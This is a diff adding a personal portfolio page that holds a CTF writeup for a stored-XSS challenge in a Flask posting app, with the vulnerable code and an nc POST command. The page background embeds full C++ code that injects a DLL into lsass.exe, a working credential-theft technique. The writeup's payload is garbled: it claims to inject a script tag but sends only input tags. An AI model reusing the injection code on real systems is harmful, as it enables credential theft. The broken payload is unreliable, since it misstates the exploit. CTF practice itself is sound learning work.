@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ Web — XSS1 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🛡️ Web — XSS1 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🛡️ Web — XSS1 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-overview">📜 Challenge Overview</h2>
+
+<p>We are given a Flask-based web app running on <code class="language-plaintext highlighter-rouge">challenge.localhost:80</code>. The app allows anonymous posting using a form, and displays submitted posts. There’s a <code class="language-plaintext highlighter-rouge">/</code> route handling both <code class="language-plaintext highlighter-rouge">GET</code> and <code class="language-plaintext highlighter-rouge">POST</code> requests.</p>
+
+<p>Here’s the relevant part of the server source:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">challenge_post</span><span class="p">():</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
+    <span class="n">db</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">INSERT INTO posts VALUES (?)</span><span class="sh">"</span><span class="p">,</span> <span class="p">[</span><span class="n">content</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">challenge_get</span><span class="p">():</span>
+    <span class="n">page</span> <span class="o">=</span> <span class="sh">"</span><span class="s">&lt;html&gt;&lt;body&gt;</span><span class="se">\n</span><span class="s">Welcome to pwnpost, the anonymous posting service. Post away!</span><span class="se">\n</span><span class="sh">"</span>
+    <span class="n">page</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">&lt;form method=post&gt;Post:&lt;input type=text name=content&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span><span class="se">\n</span><span class="sh">"</span>
+
+    <span class="k">for</span> <span class="n">post</span> <span class="ow">in</span> <span class="n">db</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT content FROM posts</span><span class="sh">"</span><span class="p">).</span><span class="nf">fetchall</span><span class="p">():</span>
+        <span class="n">page</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">&lt;hr&gt;</span><span class="sh">"</span> <span class="o">+</span> <span class="n">post</span><span class="p">[</span><span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span>
+
+    <span class="k">return</span> <span class="n">page</span> <span class="o">+</span> <span class="sh">"</span><span class="s">&lt;/body&gt;&lt;/html&gt;</span><span class="sh">"</span>
+</code></pre></div></div>
+<p>The content from the form is directly inserted into the page without any sanitization — this is a classic Stored XSS vulnerability.</p>
+
+<hr />
+
+<h2 id="exploitation-steps">Exploitation Steps</h2>
+
+<h3 id="1craft-a-malicious-payload">1.Craft a malicious payload</h3>
+<p>Inject a <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag so that when the victim visits /, it gets executed.</p>
+
+<h3 id="2send-post-request-with-payload">2.Send POST request with payload</h3>
+<p>Use nc to simulate a browser POST request:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s1">'POST / HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:40\r\n\r\ncontent=&lt;input type="text"&gt;
+;&lt;input type="text"&gt;;&lt;input type="text"&gt;'</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<p>This inserts the malicious JavaScript into the database.</p>
+
+<h3 id="3trigger-victim-to-visit">3.Trigger victim to visit</h3>
+<p>Now simulate the victim visiting the site:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/challenge/victim
+</code></pre></div></div>
+<p>The victim browser will execute the injected <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>.</p>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+<p>After executing the above steps, the victim script will trigger, and the flag will be printed in the terminal running the challenge service.
+Run the victim binary like this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/challenge/victim
+</code></pre></div></div>
+
+<p>Then the flag will be revealed if the XSS was successful.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{example_flag_value}
+</code></pre></div></div>
+
+<hr />
+
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
